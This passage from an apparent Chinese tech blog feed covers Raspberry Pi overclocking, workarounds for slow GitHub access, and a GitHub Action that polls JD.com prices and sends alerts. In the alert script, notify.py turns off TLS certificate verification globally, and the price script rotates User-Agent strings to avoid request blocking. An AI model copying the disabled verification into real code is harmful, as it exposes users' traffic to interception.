       <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img 